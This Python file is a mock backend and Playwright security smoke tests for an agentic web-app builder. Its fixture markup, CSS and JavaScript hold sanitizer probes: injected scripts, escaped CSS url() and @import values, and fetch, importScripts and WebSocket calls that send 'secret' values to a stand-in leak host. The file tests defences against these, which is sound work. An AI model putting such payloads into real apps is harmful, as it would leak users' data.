"""Agentic Web App mock backend and browser security smoke checks."""

from __future__ import annotations

import copy
from datetime import datetime, timezone
from html import escape
from http import HTTPStatus
import json
import re
import threading
import time
from typing import Any, Callable
from urllib.parse import unquote

from host.apps.personal_web_app_builder import backend as builder_backend
from host.session_options import public_session_options


ApiErrorFactory = Callable[[HTTPStatus, str], Exception]
HostApi = Callable[[str, str, dict[str, list[str]], Any], dict[str, Any]]

AGENT_PROMPT = "Refresh the dashboard analysis from its current structured data."
LOAD_ONLY_PROMPT = "This load-only request must never start an agent task."
APP_AGENT_INPUT = f"{builder_backend.REQUEST_PREFIXES['app']}\n{AGENT_PROMPT}"
MOCK_TASK_SECONDS = 1.0
CONVERSATION_EVENTS_PAGE = builder_backend.CONVERSATION_EVENT_PAGE_LIMIT
INTERIM_AGENT_MESSAGE = "Drafting the app structure and checking its saved data."
LONG_MEDIA_CONDITION = " and ".join(["(min-width: 0px)"] * 40)
MOCK_LOCK = threading.RLock()
TASK_DEADLINES: dict[str, float] = {}
DEFAULT_SESSION = {
    "agent_runtime": "codex",
    "model": "gpt-5.6-terra",
    "effort": "high",
}
def _app_markup(count: int, title: str = "Weekly focus") -> str:
    return f"""
      <div class="sanitizer-probe containment-probe">
        <img src="https://browser-leak.invalid/image?secret=html">
        <a href="https://browser-leak.invalid/navigation?secret=anchor">Leave the app</a>
        <svg>
          <script>window.__foreignScriptRan = true</script>
          <foreignObject><img src="https://browser-leak.invalid/svg?secret=foreign"></foreignObject>
        </svg>
        <math><mtext><img src="https://browser-leak.invalid/math?secret=foreign"></mtext></math>
        <template><img src="https://browser-leak.invalid/template?secret=hidden"></template>
        <noscript><img src="https://browser-leak.invalid/noscript?secret=hidden"></noscript>
        <unknown-surface>
          <img src="https://browser-leak.invalid/unknown?secret=child">
          <span id="promoted-safe-child">Safe promoted child</span>
        </unknown-surface>
        <div id="semantic-probe">
          <abbr title="Estimated">Est.</abbr>
          <mark>Highlighted</mark>
          <ruby>信<rp>(</rp><rt>trust</rt><rp>)</rp></ruby>
          <label for="probe-priority">Priority</label>
          <input id="probe-priority" name="priority" list="priority-list" inputmode="text" pattern="[A-Za-z ]+">
          <datalist id="priority-list"><option value="Ship"></option></datalist>
        </div>
      </div>
      <form action="https://browser-leak.invalid/form?secret=form">
        <main class="dashboard">
          <p class="eyebrow">Personal dashboard</p>
          <h1>{escape(title)}</h1>
          <div class="metric"><strong data-count>{count}</strong><span>open priorities</span></div>
          <label><input type="checkbox" data-action="toggle-review"> Reviewed</label>
          <div class="dashboard-actions">
            <button data-action="increment">Add priority</button>
            <button data-action="refresh-analysis">Refresh analysis</button>
          </div>
        </main>
      </form>
    """


def _empty_app() -> dict[str, Any]:
    return {
        "revision": 0,
        "html": "",
        "css": "",
        "javascript": "",
        "data": {},
        "updated_at": "1970-01-01T00:00:00Z",
    }


def _built_app(title: str = "Weekly focus") -> dict[str, Any]:
    html = _app_markup(2, title)
    css = """
      @import url(https://browser-leak.invalid/style?secret=css);
      :h\\6fst { position:fixed!important; inset:0!important; z-index:2147483647!important; }
      .dashboard { display:grid; gap:1rem; max-width:48rem; margin:0 auto; padding:3rem 1.25rem; }
      .dashboard h1 { font-size:2rem; margin:0 0 .5rem; }
      .sanitizer-probe { display:none; }
      .containment-probe { position:fixed; inset:0; z-index:2147483647; }
      .containment-probe { background-image:url(https://browser-leak.invalid/background?secret=css); }
      .containment-probe { --escaped-image:u\\72l(https://browser-leak.invalid/escaped?secret=css); background-image:var(--escaped-image); }
      .eyebrow { color:#8b8b92; text-transform:uppercase; letter-spacing:.08em; }
      .metric { --panel-start:#11151d; background:linear-gradient(135deg,#11151d,#172033); color:var(--metric-text,#f4f7fb); display:flex; align-items:baseline; gap:.55rem; padding:1.25rem; border:1px solid #2e3644; border-radius:14px; }
      .metric strong { font-size:2.5rem; }
      #semantic-probe { filter:saturate(1); clip-path:inset(0 round 1px); text-shadow:0 1px 1px #000; }
      #semantic-probe::before { content:"Safe"; }
      .dashboard-actions { display:flex; flex-wrap:wrap; gap:.65rem; }
      button { background-color:#202838; border:1px solid #3d485c; color:#f4f7fb; cursor:pointer; width:max-content; padding:.65rem .9rem; border-radius:10px; }
      @supports (display: grid) { .supports-surface { color: red; } }
      @media __LONG_MEDIA_CONDITION__ { .too-long-media { color: red; } }
      @media (max-width: 640px) { .dashboard { padding: 2rem 1rem; } }
    """.replace("__LONG_MEDIA_CONDITION__", LONG_MEDIA_CONDITION)
    return {
        "revision": 1,
        "html": html,
        "css": css,
        "javascript": f"""
      try {{ fetch('https://browser-leak.invalid/fetch?secret=worker'); }} catch (_error) {{}}
      try {{ importScripts('https://browser-leak.invalid/import?secret=worker'); }} catch (_error) {{}}
      try {{ new WebSocket('wss://browser-leak.invalid/socket?secret=worker'); }} catch (_error) {{}}
      const initialMarkup = {json.dumps(html)};
      const initialCss = {json.dumps(css)};
      const renderDashboard = data => app.render(
        initialMarkup.replace('>2</strong>', `>${{data.count}}</strong>`),
        initialCss,
      );
      app.onLoad(() => {{
        try {{
          app.render('x'.repeat({builder_backend.MAX_HTML_BYTES + 1}));
        }} catch (_error) {{
          app.notify('Oversized render rejected', 'success');
        }}
        app.askAgent('{LOAD_ONLY_PROMPT}');
        renderDashboard(app.data());
      }});
      app.on('increment', async () => {{
        const next = await app.set(['count'], app.data().count + 1);
        renderDashboard(next);
      }});
      app.on('toggle-review', event => app.notify(event.checked ? 'Review marked complete' : 'Review reopened', 'success'));
      app.on('refresh-analysis', () => app.askAgent('{AGENT_PROMPT}'));
    """,
        "data": {"count": 2, "priorities": ["Ship builder", "Review security"]},
        "updated_at": "2026-07-22T10:00:00Z",
    }


WORKSPACES: dict[str, dict[str, Any]] = {}
NEXT_TASK_SEQUENCE = 1


def reset_mock_state() -> None:
    global NEXT_TASK_SEQUENCE
    with MOCK_LOCK:
        WORKSPACES.clear()
        NEXT_TASK_SEQUENCE = 1
        TASK_DEADLINES.clear()


reset_mock_state()


def route_app_api(
    method: str,
    relative: str,
    query: dict[str, list[str]],
    body: Any,
    api_error: ApiErrorFactory,
    _host_api: HostApi,
) -> dict[str, Any]:
    try:
        return _route_app_api(method, relative, body, query)
    except builder_backend.AppError as exc:
        raise api_error(exc.status, exc.message) from exc


def _route_app_api(
    method: str,
    relative: str,
    body: Any,
    query: dict[str, list[str]] | None = None,
) -> dict[str, Any]:
    if method == "GET" and relative == "session-options":
        return {"session_options": public_session_options()}
    with MOCK_LOCK:
        _progress_tasks()
        if method == "GET" and relative == "apps":
            return _list_apps(query or {})
        if method == "POST" and relative == "apps":
            return {"app": _create_app()}
        app_match = re.fullmatch(r"apps/([^/]+)/(.*)", relative)
        if not app_match:
            raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "app not found")
        thread_id = _path_segment(app_match.group(1))
        workspace = WORKSPACES.get(thread_id)
        if workspace is None:
            raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "app not found")
        resource = app_match.group(2)
        if method == "GET" and resource == "state":
            return {"app": copy.deepcopy(workspace["app"])}
        if method == "GET" and resource == "conversation":
            tasks = _conversation_tasks(workspace)
            return {
                "tasks": tasks,
                "session": (
                    {
                        "agent_runtime": tasks[0]["agent_runtime"],
                        "model": tasks[0]["model"],
                        "effort": tasks[0]["effort"],
                    }
                    if tasks else None
                ),
            }
        if method == "GET" and resource == "conversation/events":
            return _conversation_events(workspace, query or {})
        if method == "PUT" and resource == "name":
            return {"app": _rename_app(workspace, body)}
        if method == "POST" and resource in {"archive", "unarchive"}:
            return {"app": _set_archived(workspace, resource == "archive")}
        task_match = re.fullmatch(r"tasks/([^/]+)/(cancel|kill)", resource)
        if method == "POST" and task_match:
            return _stop_task(workspace, task_match.group(1), task_match.group(2))
        if workspace["archived"]:
            raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "app not found")
        if method == "POST" and resource == "runtime/actions":
            return _runtime_action(workspace, body)
        if method == "POST" and resource == "messages":
            return _create_message(workspace, body, requested_by="user")
        if method == "POST" and resource == "runtime/agent-requests":
            return _create_message(workspace, body, requested_by="app")
    raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "route not found")


def _list_apps(query: dict[str, list[str]]) -> dict[str, Any]:
    unexpected = sorted(set(query) - {"archived"})
    if unexpected:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            f"unexpected app query fields: {', '.join(unexpected)}",
        )
    archived_values = query.get("archived") or []
    if len(archived_values) > 1 or (
        archived_values and archived_values[0] not in {"true", "false"}
    ):
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            "archived must be true or false",
        )
    archived = bool(archived_values and archived_values[0] == "true")
    apps = [
        _app_summary(workspace)
        for workspace in WORKSPACES.values()
        if workspace["archived"] is archived
    ]
    apps.sort(key=lambda app: str(app["last_used_at"]), reverse=True)
    return {"apps": apps}


def _app_summary(workspace: dict[str, Any]) -> dict[str, Any]:
    active = [
        {"task_id": task["task_id"], "status": task["status"]}
        for task in workspace["tasks"]
        if task["status"] in {"queued", "running"}
    ]
    last_used_at = max(
        [
            workspace["app"]["updated_at"],
            *[str(task["updated_at"]) for task in workspace["tasks"]],
        ]
    )
    return {
        "thread_id": workspace["thread_id"],
        "name": workspace["name"],
        "archived": workspace["archived"],
        "revision": workspace["app"]["revision"],
        "created_at": workspace["created_at"],
        "updated_at": workspace["app"]["updated_at"],
        "last_used_at": last_used_at,
        "session": copy.deepcopy(workspace["session"]),
        "active_tasks": active,
    }


def _create_app() -> dict[str, Any]:
    numbers = [
        int(match.group(1))
        for thread_id in WORKSPACES
        if (match := builder_backend.THREAD_NAME_RE.fullmatch(thread_id))
        is not None
    ]
    thread_id = f"app-{max(numbers, default=0) + 1}"
    now = _now()
    app = _empty_app()
    app["updated_at"] = now
    workspace = {
        "thread_id": thread_id,
        "name": thread_id,
        "archived": False,
        "created_at": now,
        "app": app,
        "tasks": [],
        "events": [],
        "session": None,
    }
    WORKSPACES[thread_id] = workspace
    return _app_summary(workspace)


def _rename_app(
    workspace: dict[str, Any], body: Any
) -> dict[str, Any]:
    request = builder_backend._required_object(body, "rename request")
    builder_backend._require_keys(request, {"name"}, required={"name"})
    name = builder_backend._required_text(request.get("name"), "name")
    if len(name) > builder_backend.MAX_APP_NAME_CHARS:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            f"name must be at most {builder_backend.MAX_APP_NAME_CHARS} characters",
        )
    workspace["name"] = name
    return _app_summary(workspace)


def _set_archived(
    workspace: dict[str, Any], archived: bool
) -> dict[str, Any]:
    workspace["archived"] = archived
    return _app_summary(workspace)


def _conversation_tasks(workspace: dict[str, Any]) -> list[dict[str, Any]]:
    tasks = sorted(
        workspace["tasks"],
        key=lambda task: (task["updated_at"], task["task_id"]),
        reverse=True,
    )
    tasks = copy.deepcopy(tasks[: builder_backend.CONVERSATION_TASK_LIMIT])
    for task in tasks:
        for field in ("input_message", "output_message", "error_message"):
            value = task.get(field)
            if isinstance(value, str):
                task[field] = _clip_message(value)
    return tasks


def _conversation_events(
    workspace: dict[str, Any], query: dict[str, list[str]]
) -> dict[str, Any]:
    unexpected = sorted(set(query) - {"since", "before"})
    if unexpected:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            f"unexpected conversation event query fields: {', '.join(unexpected)}",
        )
    since_values = query.get("since") or []
    before_values = query.get("before") or []
    if since_values and before_values:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST, "since and before cannot be combined"
        )
    for name, values in (("since", since_values), ("before", before_values)):
        if len(values) > 1:
            raise builder_backend.AppError(
                HTTPStatus.BAD_REQUEST,
                f"{name} must be provided once",
            )
        if values and not values[0].isdigit():
            raise builder_backend.AppError(
                HTTPStatus.BAD_REQUEST,
                f"{name} must be a non-negative integer",
            )
    if since_values:
        since = int(since_values[0])
        page = [
            event for event in workspace["events"] if event["seq"] > since
        ][:CONVERSATION_EVENTS_PAGE]
    else:
        before = int(before_values[0]) if before_values else None
        eligible = [
            event
            for event in workspace["events"]
            if before is None or event["seq"] < before
        ]
        page = eligible[-CONVERSATION_EVENTS_PAGE:]
    events = copy.deepcopy(page)
    for event in events:
        payload = event.get("payload")
        if isinstance(payload, dict) and isinstance(payload.get("message"), str):
            payload["message"] = _clip_message(payload["message"])
    return {"events": events}


def _clip_message(value: str) -> str:
    maximum = builder_backend.CONVERSATION_MESSAGE_BYTES
    encoded = value.encode()
    if len(encoded) <= maximum:
        return value
    suffix = "…".encode()
    return encoded[: maximum - len(suffix)].decode(errors="ignore") + "…"


def _runtime_action(
    workspace: dict[str, Any], body: Any
) -> dict[str, Any]:
    action = builder_backend._required_object(body, "runtime action")
    name = builder_backend._required_text(action.get("action"), "action")
    allowed = {"action", "expected_revision", "path"}
    required = {"action", "expected_revision", "path"}
    if name in {"set", "append"}:
        allowed.add("value")
        required.add("value")
    builder_backend._require_keys(action, allowed, required=required)
    if name not in {"set", "delete", "append"}:
        raise builder_backend.AppError(HTTPStatus.UNPROCESSABLE_ENTITY, "unsupported runtime action")
    revision = builder_backend._required_revision(action.get("expected_revision"))
    app = workspace["app"]
    if revision != app["revision"]:
        raise builder_backend.AppError(HTTPStatus.CONFLICT, "app state changed; reload and retry")
    path = builder_backend._validated_path(action.get("path"))
    updated = builder_backend._mutate_data(
        copy.deepcopy(app["data"]), name, path, action.get("value")
    )
    builder_backend._validated_data(updated)
    candidate = {
        **app,
        "revision": revision + 1,
        "data": updated,
        "updated_at": _now(),
    }
    builder_backend._require_state_response_fits(candidate)
    workspace["app"] = candidate
    return {"app": copy.deepcopy(candidate)}


def _create_message(
    workspace: dict[str, Any],
    body: Any,
    *,
    requested_by: str,
) -> dict[str, Any]:
    global NEXT_TASK_SEQUENCE
    request = builder_backend._required_object(body, "message request")
    config_fields = ("agent_runtime", "model", "effort")
    builder_backend._require_keys(
        request,
        {"content", *config_fields},
        required={"content"},
    )
    prefix = builder_backend.REQUEST_PREFIXES[requested_by]
    content = builder_backend._bounded_required_text(
        request.get("content"),
        "content",
        builder_backend.MAX_CHAT_MESSAGE_BYTES - len(f"{prefix}\n".encode()),
    )
    input_message = f"{prefix}\n{content}"
    supplied = [field for field in config_fields if field in request]
    if supplied and len(supplied) != len(config_fields):
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            "agent_runtime, model, and effort must be provided together",
        )
    requested: dict[str, str] | None = None
    if supplied:
        runtime = builder_backend._required_text(request.get("agent_runtime"), "agent_runtime")
        model = request.get("model")
        effort = request.get("effort")
        error = builder_backend.session_config_error(runtime, model, effort)
        if error is not None:
            raise builder_backend.AppError(HTTPStatus.BAD_REQUEST, error)
        assert isinstance(model, str) and isinstance(effort, str)
        requested = {"agent_runtime": runtime, "model": model, "effort": effort}
    session = workspace["session"]
    if session is not None:
        if requested is not None and requested != session:
            raise builder_backend.AppError(
                HTTPStatus.CONFLICT,
                "agent_runtime, model, and effort must match the existing thread configuration",
            )
        runtime = session["agent_runtime"]
        model = session["model"]
        effort = session["effort"]
    else:
        if requested is None:
            raise builder_backend.AppError(
                HTTPStatus.BAD_REQUEST,
                "agent_runtime, model, and effort are required for the first message",
            )
        workspace["session"] = requested
        runtime = requested["agent_runtime"]
        model = requested["model"]
        effort = requested["effort"]
    now = _now()
    tasks = workspace["tasks"]
    status = "queued" if any(
        task["status"] == "running" for task in tasks
    ) else "running"
    task = {
        "task_id": f"task_mock_{NEXT_TASK_SEQUENCE}",
        "thread_id": workspace["thread_id"],
        "input_message": input_message,
        "output_message": "",
        "error_message": "",
        "status": status,
        "agent_runtime": runtime,
        "model": model,
        "effort": effort,
        "created_at": now,
        "updated_at": now,
    }
    NEXT_TASK_SEQUENCE += 1
    if status == "running":
        _start_task(workspace, task)
    tasks.append(task)
    return copy.deepcopy(task)


def _stop_task(
    workspace: dict[str, Any],
    encoded_task_id: str,
    action: str,
) -> dict[str, Any]:
    task_id = _path_segment(encoded_task_id)
    task = next(
        (
            candidate
            for candidate in workspace["tasks"]
            if candidate["task_id"] == task_id
        ),
        None,
    )
    if task is None:
        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "task not found")
    expected_status = "queued" if action == "cancel" else "running"
    if task["status"] != expected_status:
        message = "only queued tasks can be cancelled" if action == "cancel" else "only running tasks can be killed"
        raise builder_backend.AppError(HTTPStatus.CONFLICT, message)
    now = _now()
    task.update({"status": "cancelled", "updated_at": now, "completed_at": now})
    TASK_DEADLINES.pop(task_id, None)
    _start_next_task(workspace)
    return {"status": "accepted"}


def _progress_tasks() -> None:
    now_monotonic = time.monotonic()
    for workspace in WORKSPACES.values():
        app = workspace["app"]
        for task in workspace["tasks"]:
            deadline = TASK_DEADLINES.get(task["task_id"])
            if (
                task["status"] != "running"
                or deadline is None
                or now_monotonic < deadline
            ):
                continue
            now = _now()
            has_bundle = bool(app["html"] or app["css"] or app["javascript"])
            output_message = (
                "Built the dashboard with durable priorities and interactive controls."
                if not has_bundle
                else (
                    "Reviewed the current structured data and refreshed the dashboard analysis."
                    if task["input_message"] == APP_AGENT_INPUT
                    else "Updated the web app from this request."
                )
            )
            task.update({
                "status": "completed",
                "updated_at": now,
                "completed_at": now,
                "output_message": output_message,
            })
            _append_task_message(
                workspace, task, output_message, "agent"
            )
            TASK_DEADLINES.pop(task["task_id"], None)
            if not has_bundle:
                title = (
                    "Weekly focus"
                    if builder_backend.THREAD_NAME_RE.fullmatch(
                        workspace["name"]
                    )
                    else workspace["name"]
                )
                built = _built_app(title)
                built["updated_at"] = now
                workspace["app"] = built
                app = built
            elif task["input_message"] == APP_AGENT_INPUT:
                app["data"] = {
                    **app["data"],
                    "analysis": "Two priorities remain open; review the security item before shipping.",
                }
                app["revision"] += 1
                app["updated_at"] = now
            else:
                app["revision"] += 1
                app["updated_at"] = now
        _start_next_task(workspace)


def _start_next_task(workspace: dict[str, Any]) -> None:
    tasks = workspace["tasks"]
    if any(task["status"] == "running" for task in tasks):
        return
    queued = next(
        (task for task in tasks if task["status"] == "queued"),
        None,
    )
    if queued is None:
        return
    _start_task(workspace, queued)


def _start_task(workspace: dict[str, Any], task: dict[str, Any]) -> None:
    now = _now()
    task.update({"status": "running", "updated_at": now, "started_at": now})
    TASK_DEADLINES[task["task_id"]] = time.monotonic() + MOCK_TASK_SECONDS
    _append_task_message(
        workspace, task, task["input_message"], "user"
    )
    _append_task_message(
        workspace, task, INTERIM_AGENT_MESSAGE, "agent"
    )


def _append_task_message(
    workspace: dict[str, Any],
    task: dict[str, Any],
    message: str,
    source: str,
) -> None:
    events = workspace["events"]
    seq = events[-1]["seq"] + 1 if events else 1
    events.append(
        {
            "seq": seq,
            "timestamp": _now(),
            "event_id": f"event_{workspace['thread_id']}_{seq}",
            "event_type": "task.message",
            "task_id": task["task_id"],
            "payload": {"message": message, "source": source},
        }
    )


def _path_segment(value: str) -> str:
    decoded = unquote(value)
    if not decoded or "/" in decoded or "\\" in decoded:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            "invalid path segment",
        )
    return decoded


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")


def desktop_smoke(page: Any) -> None:
    from playwright.sync_api import expect

    leaked: list[str] = []
    page.on("request", lambda request: leaked.append(request.url) if "browser-leak.invalid" in request.url else None)
    page.locator("#stable-app-tabs").get_by_role("button", name="Agentic Web App", exact=True).click()
    expect(page.locator("#panel-app-personal_web_app_builder")).to_be_visible()
    frame = page.frame_locator('iframe[title="Agentic Web App"]')

    expect(frame.locator("#app-title")).to_have_text("Select an app")
    expect(frame.locator(".builder-bar")).to_be_visible()
    expect(frame.locator("#first-run-how")).to_be_hidden()
    frame.locator("#new-app").click()
    expect(frame.locator("#app-title")).to_have_text("app-1")
    expect(frame.locator("#first-run-how")).to_be_visible()
    expect(frame.locator("#first-run-guidance")).to_be_visible()
    expect(frame.get_by_text("Build it through Agent chat", exact=True)).to_be_visible()
    expect(frame.get_by_text("Use the app directly", exact=True)).to_be_visible()
    expect(frame.get_by_text("Agent, Model, and Level are fixed", exact=False)).to_be_visible()
    expect(frame.locator("#runtime")).to_have_value("codex")
    expect(frame.locator("#model")).to_have_value("gpt-5.6-terra")
    expect(frame.locator("#effort")).to_have_value("high")
    expect(frame.locator("#runtime")).to_be_enabled()
    expect(frame.locator("#model")).to_be_enabled()
    expect(frame.locator("#effort")).to_be_enabled()
    expect(frame.locator("#runtime-fixed")).to_be_hidden()
    expect(frame.locator("#model-fixed")).to_be_hidden()
    expect(frame.locator("#effort-fixed")).to_be_hidden()
    frame.locator("#agent-settings-help").hover()
    expect(frame.locator("#agent-settings-help-text")).to_be_visible()
    expect(frame.locator("#agent-settings-help-text")).to_contain_text("before the first message")
    expect(frame.locator("#agent-settings-help-text")).to_contain_text("fixed for this app afterward")
    frame.get_by_role("button", name="Start building", exact=True).click()
    expect(frame.locator("#chat-drawer")).to_be_visible()
    frame.locator("#message").fill("Build a small weekly focus dashboard.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    expect(frame.locator("#chat-history")).to_contain_text("Requested by user:")
    expect(frame.locator("#chat-history")).to_contain_text("Build a small weekly focus dashboard.")
    expect(frame.locator("#chat-history")).to_contain_text(INTERIM_AGENT_MESSAGE)
    expect(frame.locator(".dashboard")).to_be_visible(timeout=8_000)
    expect(frame.locator("#runtime")).to_be_disabled()
    expect(frame.locator("#model")).to_be_disabled()
    expect(frame.locator("#effort")).to_be_disabled()
    expect(frame.locator("#runtime")).to_be_hidden()
    expect(frame.locator("#model")).to_be_hidden()
    expect(frame.locator("#effort")).to_be_hidden()
    expect(frame.locator("#runtime-fixed")).to_have_text("Codex")
    expect(frame.locator("#model-fixed")).to_have_text("gpt-5.6-terra")
    expect(frame.locator("#effort-fixed")).to_have_text("High")
    frame.locator("#agent-settings-help").hover()
    expect(frame.locator("#agent-settings-help-text")).to_be_visible()
    expect(frame.locator("#agent-settings-help-text")).to_contain_text("fixed for this app")
    expect(frame.locator("#first-run-guidance")).to_be_hidden()
    expect(frame.locator("#chat-drawer select")).to_have_count(0)
    expect(frame.locator("#runtime-status")).to_have_text("Oversized render rejected")
    frame.get_by_role("button", name="Close agent chat", exact=True).click()
    expect(frame.locator("#chat-drawer")).to_be_hidden()
    expect(frame.locator(".metric strong")).to_have_text("2")
    generated = frame.locator("#generated-host")
    expect(
        generated.locator(
            "img, a, iframe, object, embed, svg, math, template, noscript, unknown-surface, script"
        )
    ).to_have_count(0)
    expect(frame.locator("#promoted-safe-child")).to_have_text("Safe promoted child")
    expect(frame.locator("#semantic-probe abbr")).to_have_attribute("title", "Estimated")
    expect(frame.locator("#semantic-probe mark")).to_have_text("Highlighted")
    expect(frame.locator("#semantic-probe ruby rt")).to_have_text("trust")
    expect(frame.locator("#probe-priority")).to_have_attribute("name", "priority")
    expect(frame.locator("#probe-priority")).to_have_attribute("list", "priority-list")
    expect(frame.locator("#probe-priority")).to_have_attribute("inputmode", "text")
    expect(frame.locator("#priority-list option")).to_have_attribute("value", "Ship")
    foreign_script_ran = frame.locator("body").evaluate("() => window.__foreignScriptRan")
    if foreign_script_ran is not None:
        raise AssertionError("foreign-namespace script executed during sanitizer rebuild")
    sanitized_css = frame.locator("#generated-host").evaluate(
        "host => host.shadowRoot.querySelector('style').textContent"
    )
    if "@supports" in sanitized_css or "too-long-media" in sanitized_css:
        raise AssertionError(f"unsupported or oversized CSS group survived sanitization: {sanitized_css}")
    if "@media (max-width: 640px)" not in sanitized_css:
        raise AssertionError(f"bounded responsive media rule was dropped: {sanitized_css}")
    for expressive_css in (
        "--panel-start:#11151d",
        "linear-gradient",
        "filter:saturate(1)",
        "clip-path:inset(0px round 1px)",
        'content:"Safe"',
    ):
        if expressive_css not in sanitized_css:
            raise AssertionError(f"safe expressive CSS was dropped ({expressive_css}): {sanitized_css}")
    form_action = frame.locator(".dashboard").evaluate(
        "element => element.closest('form').getAttribute('action')"
    )
    if form_action is not None:
        raise AssertionError(f"generated form retained a navigation action: {form_action}")
    page.wait_for_timeout(300)
    if leaked:
        raise AssertionError(f"agent-authored UI caused browser requests: {leaked}")

    reviewed = frame.get_by_role("checkbox", name="Reviewed", exact=True)
    reviewed.click()
    expect(reviewed).to_be_checked()
    expect(frame.locator("#runtime-status")).to_have_text("Review marked complete")
    page.wait_for_timeout(100)

    frame.get_by_role("button", name="Add priority", exact=True).click()
    expect(frame.locator(".metric strong")).to_have_text("3")

    page.reload()
    expect(page.locator("#app")).to_be_visible()
    page.locator("#stable-app-tabs").get_by_role(
        "button", name="Agentic Web App", exact=True
    ).click()
    expect(frame.locator("#app-title")).to_have_text("Select an app")
    frame.get_by_role("button", name="app-1", exact=False).click()
    expect(frame.locator(".metric strong")).to_have_text("3")

    frame.get_by_role("button", name="Agent chat", exact=True).click()
    expect(frame.locator("#chat-drawer")).to_be_visible()
    expect(frame.locator("#chat-history")).to_contain_text("Requested by user:")
    expect(frame.locator("#chat-history")).to_contain_text("Built the dashboard")
    expect(frame.locator("#chat-history")).not_to_contain_text(LOAD_ONLY_PROMPT)
    frame.locator("#message").fill("Keep this unsent human draft.")
    frame.get_by_role("button", name="Close agent chat", exact=True).click()
    expect(frame.locator("#chat-drawer")).to_be_hidden()
    expect(frame.locator(".dashboard")).to_be_visible()

    frame.get_by_role("button", name="Refresh analysis", exact=True).click()
    expect(frame.locator("dialog")).to_have_count(0)
    expect(frame.locator("#runtime-status")).to_have_text("Agent started")
    frame.get_by_role("button", name="Agent chat", exact=True).click()
    expect(frame.locator("#chat-history")).to_contain_text("Requested by app:")
    expect(frame.locator("#chat-history")).to_contain_text(AGENT_PROMPT)
    expect(frame.locator("#message")).to_have_value("Keep this unsent human draft.")
    if leaked:
        raise AssertionError(f"generated interaction caused browser requests: {leaked}")

    page.once("dialog", lambda dialog: dialog.accept("Weekly focus"))
    frame.get_by_role("button", name="Rename app", exact=True).click()
    expect(frame.locator("#app-title")).to_have_text("Weekly focus")

    # A second workspace has a separate thread, bundle, data revision, and
    # conversation. Building and switching it must not disturb the first app.
    frame.locator("#new-app").click()
    expect(frame.locator("#app-title")).to_have_text("app-2")
    expect(frame.locator(".dashboard")).to_have_count(0)
    expect(frame.locator("#revision-label")).to_have_text("Empty app")
    page.once("dialog", lambda dialog: dialog.accept("Scratch app"))
    frame.get_by_role("button", name="Rename app", exact=True).click()
    frame.get_by_role("button", name="Start building", exact=True).click()
    frame.locator("#message").fill("Build a separate scratch dashboard.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    expect(frame.locator(".dashboard")).to_be_visible(timeout=8_000)
    expect(frame.locator(".dashboard h1")).to_have_text("Scratch app")
    frame.get_by_role("button", name="Close agent chat", exact=True).click()
    expect(frame.locator(".metric strong")).to_have_text("2")

    frame.locator(".app-item", has_text="Weekly focus").click()
    expect(frame.locator(".metric strong")).to_have_text("3")
    frame.get_by_role("button", name="Agent chat", exact=True).click()
    expect(frame.locator("#chat-history")).not_to_contain_text(
        "separate scratch dashboard"
    )
    frame.get_by_role("button", name="Close agent chat", exact=True).click()

    frame.locator(".app-item", has_text="Scratch app").click()
    expect(frame.locator(".metric strong")).to_have_text("2")
    frame.get_by_role("button", name="Agent chat", exact=True).click()
    expect(frame.locator("#chat-history")).to_contain_text(
        "separate scratch dashboard"
    )
    frame.get_by_role("button", name="Close agent chat", exact=True).click()
    frame.locator(".app-item", has_text="Weekly focus").click()


def mobile_smoke(page: Any) -> None:
    from playwright.sync_api import expect

    page.locator("#mobile-nav-toggle").click()
    page.locator("#stable-app-tabs").get_by_role("button", name="Agentic Web App", exact=True).click()
    frame = page.frame_locator('iframe[title="Agentic Web App"]')
    frame.get_by_role("button", name="Show app list", exact=True).click()
    frame.get_by_role("button", name="Weekly focus", exact=False).click()
    expect(frame.locator(".dashboard")).to_be_visible()
    expect(frame.locator("#runtime")).to_be_hidden()
    expect(frame.locator("#model")).to_be_hidden()
    expect(frame.locator("#effort")).to_be_hidden()
    expect(frame.locator("#runtime-fixed")).to_be_visible()
    expect(frame.locator("#model-fixed")).to_be_visible()
    expect(frame.locator("#effort-fixed")).to_be_visible()
    frame.get_by_role("button", name="Agent chat", exact=True).click()
    expect(frame.locator("#chat-drawer")).to_be_visible()
    frame.get_by_role("button", name="Close agent chat", exact=True).click()
    expect(frame.locator("#chat-drawer")).to_be_hidden()
    overflow = frame.locator("html").evaluate(
        "() => document.documentElement.scrollWidth - document.documentElement.clientWidth"
    )
    if overflow > 1:
        raise AssertionError(f"Agentic Web App overflows horizontally by {overflow}px")

    # Archiving hides the workspace without deleting its bundle or thread.
    frame.get_by_role("button", name="Archive", exact=True).click()
    expect(frame.locator("#app-title")).to_have_text("Select an app")
    frame.get_by_role("button", name="Show app list", exact=True).click()
    frame.get_by_role("button", name="Show archived", exact=True).click()
    frame.get_by_role("button", name="Weekly focus", exact=False).click()
    expect(frame.locator(".dashboard")).to_be_visible()
    expect(frame.locator("#generated-host")).to_have_class(re.compile(r"\breadonly\b"))
    frame.get_by_role("button", name="Unarchive", exact=True).click()
    expect(frame.locator("#app-title")).to_have_text("Archived apps")
